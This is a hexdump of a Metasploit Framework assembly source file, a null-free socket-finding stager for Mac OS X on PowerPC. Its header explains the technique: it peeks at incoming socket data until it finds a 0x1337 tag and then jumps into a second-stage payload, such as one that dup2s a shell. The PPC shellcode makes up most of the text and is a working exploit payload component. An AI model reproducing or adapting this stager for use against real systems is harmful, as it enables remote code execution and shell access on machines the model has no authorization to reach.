00000000  3b 3b 0d 0a 3b 0d 0a 3b  20 20 20 20 20 20 20 20  |;;..;..;        |
00000010  4e 61 6d 65 3a 20 73 74  61 67 65 72 5f 73 6f 63  |Name: stager_soc|
00000020  6b 5f 66 69 6e 64 5f 70  65 65 6b 0d 0a 3b 20 20  |k_find_peek..;  |
00000030  20 51 75 61 6c 69 74 69  65 73 3a 20 4e 75 6c 6c  | Qualities: Null|
00000040  2d 46 72 65 65 0d 0a 3b  20 20 20 50 6c 61 74 66  |-Free..;   Platf|
00000050  6f 72 6d 73 3a 20 4d 61  63 4f 53 20 58 20 2f 20  |orms: MacOS X / |
00000060  50 50 43 0d 0a 3b 20 20  20 20 20 41 75 74 68 6f  |PPC..;     Autho|
00000070  72 73 3a 20 48 20 44 20  4d 6f 6f 72 65 20 3c 20  |rs: H D Moore < |
00000080  68 64 6d 20 5b 61 74 5d  20 6d 65 74 61 73 70 6c  |hdm [at] metaspl|
00000090  6f 69 74 2e 63 6f 6d 20  3e 0d 0a 3b 20 20 20 20  |oit.com >..;    |
000000a0  20 56 65 72 73 69 6f 6e  3a 20 24 52 65 76 69 73  | Version: $Revis|
000000b0  69 6f 6e 3a 20 31 2e 31  20 24 0d 0a 3b 20 20 20  |ion: 1.1 $..;   |
000000c0  20 20 4c 69 63 65 6e 73  65 3a 0d 0a 3b 0d 0a 3b  |  License:..;..;|
000000d0  20 20 20 20 20 20 20 20  54 68 69 73 20 66 69 6c  |        This fil|
000000e0  65 20 69 73 20 70 61 72  74 20 6f 66 20 74 68 65  |e is part of the|
000000f0  20 4d 65 74 61 73 70 6c  6f 69 74 20 45 78 70 6c  | Metasploit Expl|
00000100  6f 69 74 20 46 72 61 6d  65 77 6f 72 6b 0d 0a 3b  |oit Framework..;|
00000110  20 20 20 20 20 20 20 20  61 6e 64 20 69 73 20 73  |        and is s|
00000120  75 62 6a 65 63 74 20 74  6f 20 74 68 65 20 73 61  |ubject to the sa|
00000130  6d 65 20 6c 69 63 65 6e  73 65 73 20 61 6e 64 20  |me licenses and |
00000140  63 6f 70 79 72 69 67 68  74 73 20 61 73 0d 0a 3b  |copyrights as..;|
00000150  20 20 20 20 20 20 20 20  74 68 65 20 72 65 73 74  |        the rest|
00000160  20 6f 66 20 74 68 69 73  20 70 61 63 6b 61 67 65  | of this package|
00000170  2e 0d 0a 3b 0d 0a 3b 20  44 65 73 63 72 69 70 74  |...;..; Descript|
00000180  69 6f 6e 3a 0d 0a 3b 0d  0a 3b 20 20 20 20 20 20  |ion:..;..;      |
00000190  20 20 54 68 69 73 20 70  61 79 6c 6f 61 64 20 77  |  This payload w|
000001a0  69 6c 6c 20 72 65 63 76  28 29 20 64 6f 77 6e 77  |ill recv() downw|
000001b0  61 72 64 20 75 6e 74 69  6c 20 74 68 65 20 72 65  |ard until the re|
000001c0  61 64 0d 0a 3b 20 20 20  20 20 20 20 20 64 61 74  |ad..;        dat|
000001d0  61 20 63 6f 6e 74 61 69  6e 73 20 74 68 65 20 73  |a contains the s|
000001e0  65 61 72 63 68 20 74 61  67 20 28 30 78 58 58 58  |earch tag (0xXXX|
000001f0  58 31 33 33 37 29 2e 20  4f 6e 63 65 20 74 68 65  |X1337). Once the|
00000200  0d 0a 3b 20 20 20 20 20  20 20 20 74 61 67 20 69  |..;        tag i|
00000210  73 20 6c 6f 63 61 74 65  64 2c 20 69 74 20 77 69  |s located, it wi|
00000220  6c 6c 20 6a 75 6d 70 20  69 6e 74 6f 20 74 68 65  |ll jump into the|
00000230  20 70 61 79 6c 6f 61 64  2e 20 54 68 65 0d 0a 3b  | payload. The..;|
00000240  20 20 20 20 20 20 20 20  72 65 63 76 28 29 20 63  |        recv() c|
00000250  61 6c 6c 20 69 73 20 70  61 73 73 65 64 20 74 68  |all is passed th|
00000260  65 20 4d 53 47 5f 50 45  45 4b 20 66 6c 61 67 2c  |e MSG_PEEK flag,|
00000270  20 74 68 65 20 73 74 61  67 65 0d 0a 3b 20 20 20  | the stage..;   |
00000280  20 20 20 20 20 77 69 6c  6c 20 6e 65 65 64 20 74  |     will need t|
00000290  6f 20 66 6c 75 73 68 20  74 68 65 20 72 65 63 76  |o flush the recv|
000002a0  28 29 20 71 75 65 75 65  20 62 65 66 6f 72 65 20  |() queue before |
000002b0  64 6f 69 6e 67 0d 0a 3b  20 20 20 20 20 20 20 20  |doing..;        |
000002c0  73 6f 6d 65 74 68 69 6e  67 20 6c 69 6b 65 20 64  |something like d|
000002d0  75 70 32 27 69 6e 67 20  61 20 73 68 65 6c 6c 2e  |up2'ing a shell.|
000002e0  0d 0a 3b 0d 0a 3b 3b 0d  0a 0d 0a 2e 67 6c 6f 62  |..;..;;.....glob|
000002f0  6c 20 5f 6d 61 69 6e 0d  0a 2e 74 65 78 74 0d 0a  |l _main...text..|
00000300  5f 6d 61 69 6e 3a 0d 0a  09 6c 69 09 09 72 32 39  |_main:...li..r29|
00000310  2c 20 30 78 66 66 66 0d  0a 09 6c 69 09 09 72 33  |, 0xfff...li..r3|
00000320  30 2c 20 30 78 66 66 66  0d 0a 09 61 64 64 69 63  |0, 0xfff...addic|
00000330  2e 09 72 32 38 2c 20 72  32 39 2c 20 2d 30 78 66  |..r28, r29, -0xf|
00000340  66 66 20 2b 31 0d 0a 0d  0a 66 69 6e 64 73 6f 63  |ff +1....findsoc|
00000350  6b 3a 0d 0a 09 73 75 62  66 2e 20 20 20 72 33 30  |k:...subf.   r30|
00000360  2c 20 72 32 38 2c 20 72  33 30 0d 0a 09 62 6c 74  |, r28, r30...blt|
00000370  09 09 5f 6d 61 69 6e 0d  0a 0d 0a 09 73 75 62 69  |.._main.....subi|
00000380  09 72 30 2c 20 72 32 39  2c 20 30 78 66 66 66 20  |.r0, r29, 0xfff |
00000390  2d 20 31 30 32 0d 0a 09  6d 72 09 09 72 33 2c 20  |- 102...mr..r3, |
000003a0  72 33 30 0d 0a 09 73 75  62 69 09 72 34 2c 20 72  |r30...subi.r4, r|
000003b0  31 2c 20 34 31 30 34 0d  0a 09 6c 69 09 09 72 35  |1, 4104...li..r5|
000003c0  2c 20 34 30 39 35 0d 0a  09 73 75 62 69 09 72 36  |, 4095...subi.r6|
000003d0  2c 20 72 32 39 2c 20 30  78 66 66 66 20 2d 20 30  |, r29, 0xfff - 0|
000003e0  78 38 32 0d 0a 09 2e 6c  6f 6e 67 09 30 78 34 34  |x82....long.0x44|
000003f0  66 66 66 66 30 32 0d 0a  09 78 6f 72 2e 09 72 36  |ffff02...xor..r6|
00000400  2c 20 72 36 2c 20 72 36  0d 0a 09 0d 0a 09 6c 68  |, r6, r6......lh|
00000410  7a 09 09 72 32 37 2c 20  2d 34 31 30 34 28 72 31  |z..r27, -4104(r1|
00000420  29 0d 0a 09 63 6d 70 77  69 09 72 32 37 2c 20 30  |)...cmpwi.r27, 0|
00000430  78 31 33 33 37 0d 0a 09  62 6e 65 09 09 66 69 6e  |x1337...bne..fin|
00000440  64 73 6f 63 6b 0d 0a 0d  0a 67 6f 74 73 6f 63 6b  |dsock....gotsock|
00000450  3a 0d 0a 09 73 75 62 69  09 72 34 2c 20 72 31 2c  |:...subi.r4, r1,|
00000460  20 34 31 30 30 0d 0a 09  6d 74 63 74 72 09 72 34  | 4100...mtctr.r4|
00000470  0d 0a 09 62 6c 65 63 74  72 09 0d 0a 09 78 6f 72  |...blectr....xor|
00000480  2e 09 72 36 2c 20 72 36  2c 20 72 36              |..r6, r6, r6|
0000048c
